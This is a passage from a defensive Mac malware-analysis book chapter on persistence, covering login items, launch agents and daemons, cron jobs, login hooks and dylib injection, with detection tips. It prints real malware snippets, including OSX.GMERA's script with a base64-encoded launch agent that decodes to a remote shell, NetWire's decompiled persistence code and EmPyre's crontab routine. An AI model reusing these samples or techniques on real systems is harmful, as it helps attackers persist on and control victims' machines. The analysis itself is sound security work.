{
    "id": "5cd044f2-a213-4d45-9838-082ba8859e24",
    "created_at": "2022-10-25T16:48:24.488808Z",
    "updated_at": "2025-03-27T02:11:19.275575Z",
    "deleted_at": null,
    "sha1_hash": "b7a30e31147edc126c459afbc50c59cabc8e9836",
    "title": "",
    "authors": "",
    "file_creation_date": "0001-01-01T00:00:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 2794531,
    "plain_text": "```\np. wardle\n\n```\n```\n(The Art of Mac Malware) Volume 1: Analysis\n\n```\n```\n Chapter 0x2: Persistence\n\n```\n\nğŸ“ Note:\n```\nThis book is a work in progress.\nYou are encouraged to directly comment on these pages ...suggesting edits, corrections,\nand/or additional content!\nTo comment, simply highlight any content, then click the  icon which appears (to the\nright on the documentâ€™s border).\n\n```\n\n-----\n\n```\n                                            p. wardle\nContent made possible by our Friends of Objective-Seeâ€‹ : â€‹\n     Airo SmugMug Guardian Firewall SecureMac iVerify Halo Privacy\nOnce malware has infected a system (via one of the aforementioned infection vectors or by\nany other way), more often than not, its next goal is to persist. \nPersistence is the means by which malware ensures it will be automatically (re)executed\nby the operating system on system startup or user (re)login.\n\n```\n|Col1|Col2|Col3|Col4|Col5|Col6|\n|---|---|---|---|---|---|\n|Airo|SmugMug|Guardian Firewall|SecureMac|iVerify|Halo Privacy|\n\n\nğŸ“ Note:\n```\nThe vast majority of Mac malware attempts to gain persistence ...otherwise a system\nreboot would essentially disinfect the system! \nTwo notable examples of malware that generally do not persist include:\n\n```\n  - `Ransomware:`\n```\n   Once ransomware has encrypted user files, there is no need for it to hang around.\n   Thus, such malware rarely persists. \n\n```\n  - `In-memory malware:`\n```\n   Sophisticated attackers may leverage memory-only payloads that (by design) will\n   not survive a system reboot. The appeal? An incredibly high level of stealth! \nMalware may avoid persisting if it determines that the system is not of interest, or\nperhaps if it detects a security tool is running (that would detect a persistence\nattempt or other actions taken by the malware).\n\n```\n```\nThroughout the years, malware authors have leveraged various persistence mechanisms\nranging from common and easily detected login and launch items to more sophisticated and\nstealthier approaches. \nIn this chapter, weâ€™ll discuss various persistence mechanisms, focusing on the most\npopular methods (ab)used by Mac malware. Where applicable, weâ€™ll highlight malware that\nleverages each technique. \n\n```\n\n-----\n\n```\np. wardle\n\n```\n\nğŸ“ Note:\n```\nFor a massively comprehensive (albeit now slightly dated) research paper on the topic\nof malware persistence on Appleâ€™s desktop OS, see:\n         â€œMethods of Malware Persistence on Mac OS Xâ€‹ â€â€‹ (2014) [1]\n\n```\n```\nLogin Items\n\n```\n```\nPersistence via a Login Item is a common method used by both legitimate software and\nmalware. (...in fact it is the Apple supported way to persist an application or helperâ€‹\n[2]). \nExamples of Mac malware that install themselves as login items include:\n\n```\n  - `OSX.Kitm [3] â€‹`\n\n  - `OSX.Netwireâ€‹` `[4]`\n\n  - `OSX.WindTailâ€‹` `[5]`\n```\nOnce an item (generally an application) has been installed as a Login Item, it will be\nautomatically executed each time the user logs in. The persisted item will run within the\nuserâ€™s (desktop) session, inheriting the userâ€™s permissions. \nPersisted Login Items are visible via the System Preferencesâ€‹ application. Specifically in â€‹\nthe â€œLogin Itemsâ€ tab of the â€œUsers and Groupsâ€ pane:\n                  Persistent Login Items \n           The 2nd item, â€˜Finderâ€™ is actually â€‹OSX.Netwireâ€‹ [4]\n\n```\n\n-----\n\n```\np. wardle\n\n```\n\nğŸ“ Note:\n```\nThe â€œLogin Itemâ€ tab (in the â€œUsers and Groupsâ€ pane) does not show the full path to\nthe persisted login item. Malware often takes advantage of this fact, masquerading as\nlegitimate software (such as Finder.app). \nTo view the full path of login item (to ascertain if it is legitimate or not) either:\n\n```\n  - `Control+click and select â€œShow in Finderâ€.`\n\n  - `Run a tool such as` `KnockKnockâ€‹` â€‹ `[6].`\n\n  - `Examine the backgrounditems.btm file, which contains installed Login Items.`\n```\nAs noted, Login Items are stored (by Appleâ€™s backgroundtaskmanagementagent) in a file\nnamed backgrounditems.btm found within the ~/Library/Application\nSupport/com.apple.backgroundtaskmanagementagent directory. \nFor more technical details on this file and its format, see:\n               \"Block Blocking Login Itemsâ€‹ \"â€‹ [3]\n\n```\n```\nTo programmatically persist as a Login Item, malware will most commonly invoke the\nLSSharedFileListCreate and â€‹ LSSharedFileListInsertItemURLâ€‹ APIs, though the â€‹\nSMLoginItemSetEnabled API is sometimes used as well [7]. â€‹\nAs noted, OSX.Netwireâ€‹ [4] persists as a Login Item (named â€˜Finder.appâ€™). Hereâ€™s a snippet â€‹\nof the malwareâ€™s decompiled code thatâ€™s responsible for such persistence:\n 01 eax = snprintf_chk(&var_6014, 0x400, ...., \"%s%s.app\", &var_748C, &var_788C);\n 02 edi = CFURLCreateFromFileSystemRepresentation(0x0, &var_6014, eax, 0x1);\n 03\n 04 ...\n 05\n 06 //persist malware as Login Item\n 07 eax = LSSharedFileListCreate(0x0, kLSSharedFileListSessionLoginItems, 0x0);\n 08 LSSharedFileListInsertItemURL(eax, kLSSharedFileListItemLast, 0x0, 0x0, \n 09                edi, 0x0, 0x0);\n                  Login Item Persistence \n                     (OSX.Netwire)\nIn the above code snippet, the malware first builds a path to its location on disk (via\nthe CFURLCreateFromFileSystemRepresentationâ€‹ API), then invokes the â€‹ LSSharedFileList*â€‹ APIs â€‹\nto persistently install itself as a Login Item. \n\n```\n|01 02 03 04 05 06 07 08 09|eax = snprintf_chk(&var_6014, 0x400, ...., \"%s%s.app\", &var_748C, &var_788C); edi = CFURLCreateFromFileSystemRepresentation(0x0, &var_6014, eax, 0x1); ... //persist malware as Login Item eax = LSSharedFileListCreate(0x0, kLSSharedFileListSessionLoginItems, 0x0); LSSharedFileListInsertItemURL(eax, kLSSharedFileListItemLast, 0x0, 0x0, edi, 0x0, 0x0);|\n|---|---|\n\n\n-----\n\n```\n                                            p. wardle\nNow each time the user logs in, the malware will be automatically executed by macOS.\nPersistence achieved!\n\n```\n```\nLaunch Items (Agents & Daemons)\n\n```\n```\nThe majority of Mac malware leverages Launch Agents or Daemons as a means to gain\npersistence. In fact, according to Objective-Seeâ€™s â€œThe Mac Malware of 2019â€‹ â€ report [8] â€‹\nevery piece of analyzed malware (from 2019) that persisted, did so as a launch item! \nLaunch items are the Apple recommended way to persist non-application binaries (e.g.\nsoftware updaters, background processes, etc) [2].\nExamples of Mac malware that install themselves as launch items (Agents or Daemons)\ninclude:\n\n```\n  - `OSX.CookieMinerâ€‹` `[9]`\n\n  - `OSX.Siggenâ€‹` `[10]`\n\n  - `OSX.Mokesâ€‹` `[11]`\n\n  - `...and many more!`\n```\nAs noted, launch items include both Launch Agents and Launch Daemons. Launch Daemons are\nnon-interactive and run before user login (as root). On the other hand, Launch Agents run\nonce the user has logged in (as the user) and interact with the user session. \nTo persist as a launch item, the malware can create a property list (â€˜plistâ€™) in one of\nthe following launch item directories:\nLaunch Agents:\n\n```\n    - `/Library/LaunchAgents`\n\n    - `~/Library/LaunchAgents`\n```\nLaunch Daemons:\n\n```\n    - `/Library/LaunchDaemons`\n\n\n-----\n\n```\np. wardle\n\n```\n\nğŸ“ Note:\n```\nAppleâ€™s Launch Agents live in the /System/Library/LaunchAgents directory while Launch\nDaemons live in /System/Library/LaunchDaemons.\nSince the introduction of System Integrity Protection (SIP) in OS X 10.11 (El Capitan)\nthese OS directories are now protected, therefore malware cannot modify them (i.e. they\ncannot create a â€œsystemâ€ Launch Item). As such, malware is now constrained to creating\nlaunch items in the /Library or ~/Library directories. \n\n```\n\nğŸ“ Note:\n```\nA property list (or â€œplistâ€) is an XML (or in rarer cases, a binary) document that\ncontains key/value pairs. Such plist files are ubiquitous in macOS.\nTo view the contents of a property list (plist) file in a human-readable format use\neither of the following commands:\n\n```\n  - `plutil -p <path to plist>`\n\n  - `defaults -read <path to plist>`\n```\nThese commands are especially useful, as plists can be stored in various file formats:\n   â€œ[macOS] allows various interchangeable representations for plists, including XML, â€‹\nJSON\n\n```\n\n-----\n\n```\np. wardle\n\n```\n```\n   and binary. The former two have the advantage of being human-readable, while the \n   latter offers the most efficient representation on disk, as well as fast \n   serialization/deserialization.â€ [12] â€‹\nHowever, as the most common format of property lists is XML, terminal commands such as\ncat usually suffice. \n\n```\n```\nA launch itemâ€™s property list file describes the launch item to launchdâ€‹ (the consumer of â€‹\nsuch plists). In terms of persistence, the most pertinent key/value pairs include: \n\n```\n  - `Key: Programâ€‹` `or â€‹` `Program Argumentsâ€‹` `: â€‹`\n```\n   Value: Contains the path to (and optionally arguments of), the launch itemâ€™s script\n   or binary. \n\n```\n  - `Key: RunAtLoad â€‹`\n```\n   Value: Contains a boolean that, if set to true, instructs macOS (specifically\n   launchd), to automatically launch the launch item. â€‹\n\n```\n\nğŸ“ Note:\n```\nFor a comprehensive discussion on all things related to launch items (including plists\nand their key/value pairs), see:\n                 â€œA Launchd Tutorialâ€‹ â€ [13] â€‹\n\n```\n\n-----\n\n```\n                                            p. wardle\nMalware that persists as a launch agent or daemon, often contains an embedded launch item\nproperty list file (though sometimes the plist is stored in an external resource or even\nmay be downloaded by the malwareâ€™s installer). \nAs an example, letâ€™s look at OSX.NetWireâ€‹ [4], which earlier we showed persists as a login â€‹\n\n```\n`item. Interestingly, it alsoâ€‹` â€‹ persists as a launch agent! (Perhaps the malware authors\n```\nfigured that if one persistence mechanism was detected, the other (if still undetected)\nwould continue to ensure the malware was restarted each time the user logged in).\nBelow is a snippet of decompiled code from OSX.NetWireâ€‹, that reveals the malware â€‹\ndynamically configuring an embedded Launch Agent property list template, before writing\nout to the userâ€™s /Library/LaunchAgentsâ€‹ directory. As the â€‹ RunAtLoadâ€‹ key is set to â€‹ trueâ€‹, â€‹\nthe malware will be persistently (re)started by macOS anytime the system is rebooted and\nthe user (re)logs in:\n 01 memcpy(esi, \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n<!DOCTYPE plist PUBLIC\n 02 \\\"-//Apple Computer//DTD PLIST\n 03 1.0//EN\\n\\t\\\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\\\">\\n<plist\n 04 version=\\\"1.0\\\">\\n<dict>\\n  <key>Label</key>\\n  <string>%s</string>\\n\n 05 <key>ProgramArguments</key>\\n<array>\\n    <string>%s</string>\\n  </array>\\n\n 06 <key>RunAtLoad</key>\\n  <true/>\\n  <key>KeepAlive</key>\\n\n 07 <%s/>\\n</dict>\\n</plist>\", ...);\n 08\n 09 ... \n 10\n 11 eax = getenv(\"HOME\");\n 12 eax = snprintf_chk(&var_6014, 0x400, 0x0, 0x400, \"%s/Library/LaunchAgents/\", eax);\n 13 ...\n 14 eax = snprintf_chk(edi, 0x400, 0x0, 0x400, \"%s%s.plist\", &var_6014, 0xe5d6);\nOnce the malware has executed the above code, we can view the final plist\n(com.mac.host.plistâ€‹ ) that it has written out to disk. via the â€‹ defaultsâ€‹ command: â€‹\n\n```\n|01 02 03 04 05 06 07 08 09 10 11 12 13 14|memcpy(esi, \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n<!DOCTYPE plist PUBLIC \\\"-//Apple Computer//DTD PLIST 1.0//EN\\n\\t\\\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\\\">\\n<plist version=\\\"1.0\\\">\\n<dict>\\n <key>Label</key>\\n <string>%s</string>\\n <key>ProgramArguments</key>\\n<array>\\n <string>%s</string>\\n </array>\\n <key>RunAtLoad</key>\\n <true/>\\n <key>KeepAlive</key>\\n <%s/>\\n</dict>\\n</plist>\", ...); ... eax = getenv(\"HOME\"); eax = snprintf_chk(&var_6014, 0x400, 0x0, 0x400, \"%s/Library/LaunchAgents/\", eax); ... eax = snprintf_chk(edi, 0x400, 0x0, 0x400, \"%s%s.plist\", &var_6014, 0xe5d6);|\n|---|---|\n\n```\n$ defaults read ~/Library/LaunchAgents/com.mac.host.plist\n{\n  KeepAlive = 0;\n  Label = \"com.mac.host\";\n  ProgramArguments =   (\n    \"/Users/user/.defaults/Finder.app/Contents/MacOS/Finder\"\n  );\n  RunAtLoad = 1;\n\n```\n\n-----\n\n```\np. wardle\n\n```\n```\n}\n\n```\n```\nNote the path to the persistent component of the malware, in the ProgramArgumentsâ€‹ key: â€‹\n/Users/user/.defaults/Finder.app/Contents/MacOS/Finder. â€‹\n\n```\n\nğŸ“ Note:\n```\nThe malware programmatically determines the (current) userâ€™s name at runtime, as to\nensure the full path is valid. (On my analysis virtual machine, the current user is\nuncreatively named â€œuserâ€).\nIn order to â€œhideâ€, the malware creates, then installs itself into a directory named\n.defaultsâ€‹ . On macOS, by default, Finder.app will not display directories that begin â€‹\nwith â€œ.â€ \n\n```\n```\nAlso as noted, since the RunAtLoadâ€‹ key is set to 1 (â€˜trueâ€™) the system will automatically â€‹\nlaunch the malwareâ€™s binary (Finder.appâ€‹ ) each time the user logs in. â€‹\nAnother example of a Mac malware specimen that persists as a launch item is \nOSX.GMERAâ€‹ [14]. Distributed as a trojanized crypto-currency trading application, it\ncontains a script named run.shâ€‹ in the â€‹ Resources/â€‹ directory of its application bundle: â€‹\nThis script will install a persistent (hidden) Launch Agent to:\n~/Library/LaunchAgents/.com.apple.upd.plist: â€‹\n\n```\n\n-----\n\n```\np. wardle\n\n```\n```\n$ cat Stockfoli.app/Contents/Resources/run.sh \n#! /bin/bash\n...\nplist_text=\"PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IF\nBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Q\ncm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KCTxrZXk+S2VlcEFsaX\nZlPC9rZXk+Cgk8dHJ1ZS8+Cgk8a2V5PkxhYmVsPC9rZXk+Cgk8c3RyaW5nPmNvbS5hcHBsZXMuYXBwcy51cGQ8\nL3N0cmluZz4KCTxrZXk+UHJvZ3JhbUFyZ3VtZW50czwva2V5PgoJPGFycmF5PgoJCTxzdHJpbmc+c2g8L3N0cm\nluZz4KCQk8c3RyaW5nPi1jPC9zdHJpbmc+CgkJPHN0cmluZz5lY2hvICdkMmhwYkdVZ09qc2daRzhnYzJ4bFpY\nQWdNVEF3TURBN0lITmpjbVZsYmlBdFdDQnhkV2wwT3lCc2MyOW1JQzEwYVNBNk1qVTNNek1nZkNCNFlYSm5jeU\nJyYVd4c0lDMDVPeUJ6WTNKbFpXNGdMV1FnTFcwZ1ltRnphQ0F0WXlBblltRnphQ0F0YVNBK0wyUmxkaTkwWTNB\ndk1Ua3pMak0zTGpJeE1pNHhOell2TWpVM016TWdNRDRtTVNjN0lHUnZibVU9JyB8IGJhc2U2NCAtLWRlY29kZS\nB8IGJhc2g8L3N0cmluZz4KCTwvYXJyYXk+Cgk8a2V5PlJ1bkF0TG9hZDwva2V5PgoJPHRydWUvPgo8L2RpY3Q+\nCjwvcGxpc3Q+\"\necho \"$plist_text\" | base64 --decode > \"/tmp/.com.apple.upd.plist\"\necho \"tmpplist - $(cat /tmp/.com.apple.upd.plist))\" >> /tmp/loglog\ncp \"/tmp/.com.apple.upd.plist\" \"$HOME/Library/LaunchAgents/.com.apple.upd.plist\"\necho \"tmpplist - $(cat $HOME/Library/LaunchAgents/.com.apple.upd.plist))\" >>\n/tmp/loglog\nlaunchctl load \"/tmp/.com.apple.upd.plist\"\n\n```\n```\n                       run.sh \n                      OSX.GMERA \nOnce the malware has been installed, we can examine the (now decoded) Launch Agent\nproperty list:\n\n```\n```\n$ cat ~/Library/LaunchAgents/.com.apple.upd.plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ...>\n<plist version=\"1.0\">\n<dict>\n <key>KeepAlive</key>\n <true/>\n <key>Label</key>\n <string>com.apples.apps.upd</string>\n <key>ProgramArguments</key>\n <array>\n  <string>sh</string>\n  <string>-c</string>\n  <string>echo 'd2hpbGUgOjs...RvbmU=' | base64 --decode | bash</string>\n\n```\n\n-----\n\n```\np. wardle\n\n```\n```\n </array>\n <key>RunAtLoad</key>\n <true/>\n</dict>\n\n```\n```\nAs the ~/Library/LaunchAgents/.com.apple.upd.plistâ€‹ has the â€‹ RunAtLoadâ€‹ key set to â€‹ true,â€‹ the â€‹\ncommands specified in the ProgramArgumentsâ€‹ array (that decode to a remote shell) will be â€‹\nautomatically executed each time the user logs in. \n\n```\n`As a final example of Launch Item persistence, letâ€™s take a look at OSX.EvilQuestâ€‹` â€‹ `[15].`\n```\nThis malware will persist as a Launch Daemon if it is running with root privileges.\n(Recall that to create a Launch Daemon, one has to possess such privileges). And what if\nthe malware finds itself only running with user privileges? In that case, it simply\ncreates a user Launch Agent.\nOSX.EvilQuestâ€‹ [15] contains an embedded property list template for launch item\npersistence. In an attempt to complicate analysis though, this template is encrypted.\nHowever, in a debugger we can simply wait until the malware (named toolroomdâ€‹ ) has â€‹\ndecrypted the embedded property list template. Then, view it (now unencrypted) in memory:\n\n```\n```\n$ lldb /Library/mixednkey/toolroomd\n...\n(lldb) x/s $rax\n0x100119540: \"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n<!DOCTYPE plist PUBLIC\n\"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\\n<plist\nversion=\"1.0\">\\n<dict>\\n<key>Label</key>\\n<string>%s</string>\\n\\n<key>ProgramArguments\n</key>\\n<array>\\n<string>%s</string>\\n<string>--silent</string>\\n</array>\\n\\n<key>RunA\ntLoad</key>\\n<true/>\\n\\n<key>KeepAlive</key>\\n<true/>\\n\\n</dict>\\n</plist>\"\n\n```\n```\ndecrypted property list template \n     (OSX.EvilQuest)\n\n```\n\nğŸ“ Note:\n```\nIn subsequent chapters we cover both debugging and defeating such anti-analysis\ntechniques:\n\n```\n  - `Chapter 0x0A: Debugging`\n\n  - `Chapter 0x0B: Anti-Analysis`\n\n\n-----\n\n```\n                                            p. wardle\nOnce OSX.EvilQuestâ€‹ has completed its installation and persistently infected the system, â€‹\nwe can also simply read the launch daemon property list (named com.apple.questd.plistâ€‹ ) â€‹\nthat is stored in the /Library/LaunchDaemons/â€‹ directory: â€‹\n\n```\n```\n$ cat /Library/LaunchDaemons/com.apple.questd.plist \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n  <string>questd</string>\n  <key>ProgramArguments</key>\n  <array>\n    <string>sudo</string>\n    <string>/Library/AppQuest/com.apple.questd</string>\n    <string>--silent</string>\n  </array>\n  <key>RunAtLoad</key>\n  <true/>\n  <key>KeepAlive</key>\n  <true/>\n  ...\n</dict>\n\n```\n```\nAs the RunAtLoadâ€‹ key is set to â€‹ trueâ€‹, the value held in the â€‹ ProgramArgumentsâ€‹ array will be â€‹\nautomatically executed each time the system is rebooted. Specifically, macOS will execute\nmalware (com.apple.questdâ€‹ ) via: â€‹ sudo /Library/AppQuest/com.apple.questd --silentâ€‹ . â€‹\n\n```\n```\nCron Jobs\n\n```\n```\nWith core foundations in BSD, macOS affords several â€œunix-likeâ€ persistence mechanisms\nthat may be (ab)used by Mac malware. Cron jobs are one such example, providing a way for\nitems (scripts, commands, binaries, etc.) to be persistently executed at certain\nintervals.\n\n```\n\nğŸ“ Note:\n\n\n-----\n\n```\n                                            p. wardle\nFor a comprehensive discussion on Cron Jobs, including the syntax of job creation, see: \n\n```\n```\nâ€œCronâ€‹ â€â€‹ [16]\n\n```\n```\nTo register a persistent cron job, malware can invoke the built-in /usr/bin/crontab â€‹\nutility. \nAbusing cron jobs for persistence is not particularly common in macOS malware. However,\nthe popular (open-source) post exploitation agent EmPyreâ€‹ [17] (which is leveraged by â€‹\nvarious Mac malware), provides an example. Specifically, in its â€œcrontabâ€ persistence\n\n```\n`module,` `EmPyreâ€‹` â€‹ `directly invokes the crontabâ€‹` `binary to persistently install itself: â€‹`\n```\n 01 cmd = 'crontab -l | { cat; echo \"%s * * * * %s\"; } | crontab -'\n 02 subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()\n 03\n 04 subprocess.Popen('crontab -l', shell=True, \n 05          stdout=subprocess.PIPE).stdout.read()\n 06\n 07 subprocess.Popen('chmod +x %s', shell=True, \n 08          stdout=subprocess.PIPE).stdout.read()\n\n```\n`Another example of Mac malware that persists via a Cron Job is OSX.Janicabâ€‹` â€‹ [18]:\n\n|01 02 03 04 05 06 07 08|cmd = 'crontab -l | { cat; echo \"%s * * * * %s\"; } | crontab -' subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read() subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read() subprocess.Popen('chmod +x %s', shell=True, stdout=subprocess.PIPE).stdout.read()|\n|---|---|\n\n\n-----\n\n```\np. wardle\n\n```\n\nğŸ“ Note:\n```\nGenerally, persistent Cron Jobs are automatically executed at specified intervals (such\nas hourly, daily, weekly), versus at specified events, such as user login. (Though\nthere is a â€˜@rebootâ€™ option).\nFor more details on the scheduling options, see the crontabâ€™s man page ($ man crontab)\nor:\n              â€œScheduling Jobs With Crontab on macOSâ€‹ â€â€‹ [19]\n\n```\n```\nTo enumerate persistent crontabs, execute the crontab -lâ€‹ command â€‹\n\n```\n\nğŸ“ Note:\n```\nThe crontab -l command lists the scheduled jobs for the user who ran the command. \nThus for example, to view rootâ€™s Cron Jobs (vs. the logged in user), run crontab from a\nroot prompt, or via sudo.\nOr (with adequate privileges), simply examine all files in the /var/at/tabs/ directory.\n\n```\n\n-----\n\n```\np. wardle\n\n```\n```\nLogin/Logout Hooks\n\n```\n```\nYet another way to achieve persistence on macOS is via login and logout hooks:\n   â€œBy creating a login or logout hook, a script or command can â€‹\n   automatically be executed whenever a user logs in or out.â€ [1] â€‹\nThese â€œhooksâ€ are stored in the ~/Library/Preferences/com.apple.loginwindow.plistâ€‹ file as â€‹\nkey value pairs. The keyâ€™s name should be either LoginHookâ€‹ or â€‹ LogoutHookâ€‹, with a string â€‹\nvalue set to the path execute at either login or logout: \n\n```\n\nğŸ“ Note:\n```\nThere can only be one LoginHook and one LogoutHook key/value pair specified at any\ngiven time. \nHowever, if malware encounters a system with a (legitimate) login/logout hook, it would\nbe possible to append additional commands to the existing hook to gain persistence. \nAlso, it is worth noting that such hooks are currently deprecated by Apple, and thus\nmay cease to work in a future version of macOS. \n\n```\n\n-----\n\n```\np. wardle\n\n```\n```\nDynamic Libraries\n\n```\n```\nThe majority of persistence mechanisms (ab)used by Mac malware ensure that an application\nor binary will be automatically (re)launched by the OS. While this is all well and good\nin terms of gaining persistence, it results in a new process that an inquisitive user may\nnotice if they peek at a process list. \nFar more stealthy persistence mechanisms leverage dynamic libraries (or dylibs). \n\n```\n\nğŸ“ Note:\n\n`Appleâ€™s` `developer documentationâ€‹` â€‹ `[20] explains the reasoning and (legitimate) use of`\n```\ndynamic libraries:\nâ€œApps are rarely implemented as a single module of code because operating systems â€‹\nimplement much of the functionality apps need in libraries. To develop apps,\nprogrammers link their custom code against these libraries to get basic\nfunctionality... However, linking to libraries creates large executable files and\nwastes memory. One way to reduce the file size and memory footprint of apps is to\nreduce the amount of code that is loaded at app launch. Dynamic libraries address this\nneed; they can be loaded either at app launch time or at runtimeâ€ â€‹\n\n```\n```\nWeâ€™ll first discuss generic methods of dylib persistence that have the potential to be\n(ab)used by malware to target a wide range of processes. Following this, weâ€™ll explore\nspecific plugin-based persistence approaches that malware can leverage to obtain a\nstealthy means of (re)execution. \n\n```\n\nğŸ“ Note:\n```\nUsing dylib injection techniques to achieve persistence requires that the target\nprocess is started either automatically or regularly by the user (e.g. their browser).\nIn other words, the malicious dylib piggy-backs off the target processâ€™s persistence. \nBeyond persistence, malware authors may abuse such techniques as a means to subvert\nprocesses of interest (for example a process that has been granted access to the userâ€™s\nwebcam). Although this chapter is focused on persistence, we briefly discuss this angle\nas well.\n\n```\n```\nVia the DYLD_INSERT_LIBRARIESâ€‹ environment variable, a (possibly) malicious library can be â€‹\nâ€˜injectedâ€™ at load time into a target process. This is articulated in the â€œMethods of â€‹\nMalware Persistence on mac OS Xâ€â€‹ [1] which states:\n\n```\n\n-----\n\n```\n                                         p. wardle\nâ€œSpecifically, when loading a process, the dynamic loader will examine the â€‹\nDYLD_INSERT_LIBRARIES variable and load any libraries it specifies. By abusing this\ntechnique, an attacker can ensure that a malicious library will persistently be\nloaded into a targeted process whenever that process is started.â€ [1] â€‹\n\n```\n\nğŸ“ Note:\n```\nFor (more) technical details on this technique, see:\n         â€œSimple code injection using DYLD_INSERT_LIBRARIESâ€‹ â€â€‹ [21]\n\n```\n```\nThough normally leveraged as an injection technique, as noted in the quotation above,\nmalware can also abuse the DYLD_INSERT_LIBRARIESâ€‹ to achieve persistence, gaining â€‹\nautomatic execution each time the target process is started. If the process is started\nautomatically or commonly by the user, this affords a fairly reliable and highly stealthy\npersistence technique. \nIf targeting a launch item (a launch agent or launch daemon), malware can modify the\nitemâ€™s property list. This can be done by inserting a key/value pair where the key,\nEnvironmentVariables, references a dictionary containing a â€‹ DYLD_INSERT_LIBRARIESâ€‹ key and â€‹\na value that points to the dylib to â€œinsertâ€. \nFor applications, the approach is fairly similar but involves modifying the applicationâ€™s\nInfo.plist file and inserting a similar key/value pair, albeit with a key name of\nLSEnvironment. â€‹\n\n```\n\nğŸ“ Note:\n\n`Since 2012 when OSX.FlashBack.Bâ€‹` â€‹ `[22] abused this technique, Apple has drastically`\n```\nreduced the â€œpowerâ€ of the DYLD_INSERT_LIBRARIES. \nFor example the dynamic loader (dyld) ignores the DYLD_INSERT_LIBRARIES environment\nvariable in a wide range of cases, such as setuid and platform binaries. And, starting\nwith macOS Catalina, only 3rd-party applications that are notâ€‹ compiled with the â€‹\nhardened runtime (which â€œprotects the runtime integrity of softwareâ€ [22]), or have an\nexception such as the com.apple.security.cs.allow-dyld-environment-variables â€‹\nentitlement) are susceptible to dylib insertions. \nFor more details on the security features afforded by the hardened runtime, see Appleâ€™s\ndocumentation: \n                  â€œHardened Runtimeâ€‹ â€â€‹ [23]\n\n```\n\n-----\n\n```\n                                            p. wardle\nThe (in)famous OSX.FlashBack.Bâ€‹ [22] malware abused â€‹ DYLD_INSERT_LIBRARIESâ€‹ to maintain â€‹\npersistence by targeting usersâ€™ browsers: \n\n```\n`â€œA â€‹` `DYLD_INSERT_LIBRARIESâ€‹` â€‹ environment variable is also added to the targeted\n```\n   browsers as a launch point. This is done by inserting a â€‹LSEnvironment entry to the â€‹\n   corresponding â€‹Info.plistâ€‹ of the browsersâ€ [22]: â€‹\n\n```\n```\n$ cat /Applications/Safari.app/Contents/Info.plist:\n...\n<key>LSEnvironment</key>\n<dict>\n <key>DYLD_INSERT_LIBRARIES</key>\n <string>/Applications/Safari.app/Contents/Resources/%payload_filename%</string>\n</dict>\n\n```\n```\n                 DYLD_INSERT_LIBRARIES persistence â€‹\n                     (OSX.FlashBack.B)\nTo detect the abuse of this dylib persistence technique, you can first enumerate all\ninstalled launch items and applications, then check the relevant property list for the\ninclusions of a DYLD_INSERT_LIBRARIESâ€‹ key/value pair. â€‹\nA more modern approach to dylib injection involves a technique Iâ€™ve coined â€œdylib â€‹\nproxyingâ€. In short, a library that a target process depends on is replaced by a â€‹\nmalicious dylib. To ensure legitimate functionality is not lost, the malicious library\nâ€œproxiesâ€ requests to/from the original library. \n\n```\n\nğŸ“ Note:\n```\nTo ensure persistence, malware may target processes that are automatically started by\nthe OS, or launched by the user on a regular basis.\n\n```\n\n-----\n\n```\n                                            p. wardle\n                     dylib proxying\nAt an implementation level, such proxying is achieved by creating a dynamic library that\ncontains a LC_REEXPORT_DYLIBâ€‹ load command. Though weâ€™ve yet to see malware abuse this â€‹\ntechnique (as of 2020), it has been leveraged by security researchers in order to\nâ€œexploitâ€ various applications ...such as Zoom.appâ€™s access to the webcam [24]. In the\ncase of Zoom.app, a malicious proxy library targeting Zoomâ€™s libssl.1.0.0.dylibâ€‹ was â€‹\ncreated, containing a LC_REEXPORT_DYLIBâ€‹ load command pointing to the original SSL dynamic â€‹\nlibrary (renamed _libssl.1.0.0.dylibâ€‹ ): â€‹\n\n```\n```\n$ otool -l /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib \n...\nLoad command 11\n     cmd LC_REEXPORT_DYLIB\n   cmdsize 96\n     name /Applications/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib\n  time stamp 2 Wed Dec 31 14:00:02 1969\n   current version 1.0.0\ncompatibility version 1.0.0\n\n```\n```\nThe LC_REEXPORT_DYLIBâ€‹ load command tells the dynamic loader (â€‹ dyldâ€‹ ), â€œâ€‹ hey, while the â€‹\n[malicious] library doesn't implement the required functionality youâ€™re looking for, I\nknow who does!â€‹â€\nIn our example, which targets Zoom.app, once the malicious proxy dylib has been created,\nanytime Zoom is launched by the user, the library will be automatically loaded as well\nand its constructor executed. This affords both persistence and, as noted, access to\nZoomâ€™s privacy permissions (e.g. mic and camera access). \nA more stealthy (albeit less generic) version of dylib proxying is â€œdylib hijackingâ€‹ â€. â€‹\n[25] In a dylib hijack, an attacker finds an application that attempts to load dynamic\nlibraries from multiple locations. If the primary location does not contain the dylib, an\nattacker can plant a malicious dylib, which will then be loaded by the application. In\n\n```\n\n-----\n\n```\n                                            p. wardle\nthe example below, an application attempts to load blah.dylibâ€‹ first from the â€‹\napplicationâ€™s Library/â€‹ directory (then from the â€‹ /System/Libraryâ€‹ directory). Since 